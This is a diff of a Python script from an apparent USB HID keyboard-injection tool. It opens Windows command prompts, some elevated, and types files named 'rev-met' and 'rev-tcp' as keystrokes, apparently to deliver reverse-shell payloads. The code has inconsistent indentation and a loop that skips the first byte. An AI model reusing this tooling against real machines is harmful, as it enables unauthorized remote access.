@@ -33,41 +33,38 @@ elif (args.es):
 elif (args.es):
 	locale='sv'
 
+def read_file(filename):
+	try:
+		f = open(filename, "rb")
+    		byte = f.read(1)
+    		while byte != "":
+        		byte = f.read(1)
+			findinlist(byte, locale)
+	finally:
+    		f.close()
+
 # HID Command Options
-
 if (args.wincmd):
-	f = open("/sdcard/files/hid-cmd.conf", "rb")
-    wincmd(locale)
-elif (args.win7cmd):
-	f = open("/sdcard/files/hid-cmd.conf", "rb")
-	win7cmd_elevated(byte, locale)
-elif (args.win8cmd):
-	f = open("/sdcard/files/hid-cmd.conf", "rb")
-	win8cmd_elevated(byte, locale)
-elif (args.win8_met):
-	f = open("/sdcard/files/rev-met", "rb")
-	win8cmd_elevated(byte, locale)
-elif (args.revtcp):
-	f = open("/sdcard/files/rev-tcp", "rb")
 	wincmd(locale)
+	read_file(filename = "/sdcard/files/hid-cmd.conf")
+elif (args.win7cmd):
+	win7cmd_elevated(locale)
+	read_file(filename = "/sdcard/files/hid-cmd.conf")
+elif (args.win8cmd):
+	win8cmd_elevated(locale)
+	read_file(filename = "/sdcard/files/hid-cmd.conf")
+elif (args.win8_met):
+	win8cmd_elevated(locale)
+	read_file(filename = "/sdcard/files/rev-met")
+elif (args.revtcp):
+	wincmd(locale)
+	read_file(filename = "/sdcard/files/rev-tcp")
 elif (args.revtcpwin7):
-	f = open("/sdcard/files/rev-tcp", "rb")
-	win7cmd_elevated(byte, locale)
+	win7cmd_elevated(locale)
+	read_file(filename = "/sdcard/files/rev-tcp")
 elif (args.revtcpwin8):
-	f = open("/sdcard/files/rev-tcp", "rb")
-	win8cmd_elevated(byte, locale)
+	win8cmd_elevated(locale)
+	read_file(filename = "/sdcard/files/rev-tcp")
 
-try:
-    byte = f.read(1)
-    while byte != "":
-        byte = f.read(1)
-	findinlist(byte, locale)
-
-finally:
-    f.close()
-
-#Hit enter
+# All finished - Hit enter
 enterb()
-
-
-
